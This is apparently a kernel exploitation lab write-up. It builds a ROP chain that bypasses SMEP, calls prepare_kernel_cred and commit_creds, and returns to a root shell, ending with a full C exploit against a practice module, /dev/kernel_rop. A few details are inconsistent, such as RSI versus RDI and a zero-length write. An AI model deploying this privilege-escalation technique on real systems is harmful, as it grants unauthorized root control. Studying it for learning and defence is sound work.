---
description: Bypassing SMEP by ropping through the kernel
---

# Kernel ROP - Privilege Escalation in Kernel Space

The previous approach failed, so let's try and escalate privileges using purely ROP.&#x20;

## Modifying the Payload

### Calling prepare\_kernel\_cred()

First, we have to change the ropchain. Start off with finding some useful gadgets and calling `prepare_kernel_cred(0)`:

```c
uint64_t pop_rdi    =  0xffffffff811e08ec;
uint64_t swapgs     =  0xffffffff8129011e;
uint64_t iretq_pop1 =  0xffffffff81022e1f;

uint64_t prepare_kernel_cred    = 0xffffffff81066fa0;
uint64_t commit_creds           = 0xffffffff81066e00;

int main() {
    // [...]

    // overflow
    uint64_t payload[7];

    int i = 6;

    // prepare_kernel_cred(0)
    payload[i++] = pop_rdi;
    payload[i++] = 0;
    payload[i++] = prepare_kernel_cred;
    
    // [...]
}
```

Now comes the trickiest part, which involves moving the result of RAX to RSI before calling `commit_creds()`.

### Moving RAX to RDI for commit\_creds()

This requires stringing together a collection of gadgets (which took me an age to find). See if you can find them!

I ended up combining these four gadgets:

```c
0xffffffff810dcf72: pop rdx; ret
0xffffffff811ba595: mov rcx, rax; test rdx, rdx; jne 0x3ba58c; ret;
0xffffffff810a2e0d: mov rdx, rcx; ret;
0xffffffff8126caee: mov rdi, rax; cmp rdi, rdx; jne 0x46cae5; xor eax, eax; ret;
```

* **Gadget 1** is used to set RDX to `0`, so we bypass the `jne` in **Gadget 2** and hit `ret`
* **Gadget 2** and **Gadget 3** move the returned cred struct from RAX to RDX
* **Gadget 4** moves it from RAX to RDI, then compares RDI to RDX. We need these to be equal to bypass the `jne` and hit the `ret`

<pre class="language-c"><code class="lang-c">uint64_t pop_rdx                = 0xffffffff810dcf72;   // pop rdx; ret
uint64_t mov_rcx_rax            = 0xffffffff811ba595;   // mov rcx, rax; test rdx, rdx; jne 0x3ba58c; ret;
uint64_t mov_rdx_rcx            = 0xffffffff810a2e0d;   // mov rdx, rcx; ret;
uint64_t mov_rdi_rax            = 0xffffffff8126caee;   // mov rdi, rax; cmp rdi, rdx; jne 0x46cae5; xor eax, eax; ret;
<strong>
</strong><strong>// [...]
</strong><strong>
</strong><strong>// commit_creds()
</strong>payload[i++] = pop_rdx;
payload[i++] = 0;
payload[i++] = mov_rcx_rax;
payload[i++] = mov_rdx_rcx;
payload[i++] = mov_rdi_rax;
payload[i++] = commit_creds;
</code></pre>

### Returning to userland

Recall that we need `swapgs` and then `iretq`. Both can be found easily.

```
0xffffffff8129011e: swapgs; ret;
0xffffffff81022e1f: iretq; pop rbp; ret;
```

The `pop rbp; ret` is not important as `iretq` jumps away anyway.

To simulate the pushing of RIP, CS, SS, etc we just create the stack layout as it would expect - `RIP|CS|RFLAGS|SP|SS`, the reverse of the order they are pushed in.

```c
// commit_creds()
payload[i++] = swapgs;
payload[i++] = iretq;
payload[i++] = user_rip;
payload[i++] = user_cs;
payload[i++] = user_rflags;
payload[i++] = user_rsp;
payload[i++] = user_ss;

payload[i++] = (uint64_t) escalate;
```

If we try this now, we successfully escalate privileges!

## Final Exploit

```c
// gcc -static -o exploit exploit.c

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <stdint.h>

void get_shell(void){
    puts("[*] Returned to userland");
    system("/bin/sh");
}

uint64_t user_cs;
uint64_t user_ss;
uint64_t user_rsp;
uint64_t user_rflags;

uint64_t user_rip = (uint64_t) get_shell;

void save_state(){
    puts("[*] Saving state");

    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_rsp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );

    puts("[+] Saved state");
}

void escalate() {
    __asm__(
        ".intel_syntax noprefix;"
        "xor rdi, rdi;"
        "movabs rcx, 0xffffffff81066fa0;"   // prepare_kernel_cred
	    "call rcx;"
        
        "mov rdi, rax;"
	    "movabs rcx, 0xffffffff81066e00;"   // commit_creds
	    "call rcx;"

        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_rsp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );
}

uint64_t pop_rdi    =  0xffffffff811e08ec;
uint64_t swapgs     =  0xffffffff8129011e;
uint64_t iretq      =  0xffffffff81022e1f;              // iretq; pop rbp; ret

uint64_t prepare_kernel_cred    = 0xffffffff81066fa0;
uint64_t commit_creds           = 0xffffffff81066e00;

uint64_t pop_rdx                = 0xffffffff810dcf72;   // pop rdx; ret
uint64_t mov_rcx_rax            = 0xffffffff811ba595;   // mov rcx, rax; test rdx, rdx; jne 0x3ba58c; ret;
uint64_t mov_rdx_rcx            = 0xffffffff810a2e0d;   // mov rdx, rcx; ret;
uint64_t mov_rdi_rax            = 0xffffffff8126caee;   // mov rdi, rax; cmp rdi, rdx; jne 0x46cae5; xor eax, eax; ret;

int main() {
    save_state();

    // communicate with the module
    int fd = open("/dev/kernel_rop", O_RDWR);
    printf("FD: %d\n", fd);

    // overflow
    uint64_t payload[25];

    int i = 6;

    // prepare_kernel_cred(0)
    payload[i++] = pop_rdi;
    payload[i++] = 0;
    payload[i++] = prepare_kernel_cred;

    // commit_creds()
    payload[i++] = pop_rdx;
    payload[i++] = 0;
    payload[i++] = mov_rcx_rax;
    payload[i++] = mov_rdx_rcx;
    payload[i++] = mov_rdi_rax;
    payload[i++] = commit_creds;
        

    // commit_creds()
    payload[i++] = swapgs;
    payload[i++] = iretq;
    payload[i++] = user_rip;
    payload[i++] = user_cs;
    payload[i++] = user_rflags;
    payload[i++] = user_rsp;
    payload[i++] = user_ss;

    payload[i++] = (uint64_t) escalate;

    write(fd, payload, 0);
}

```
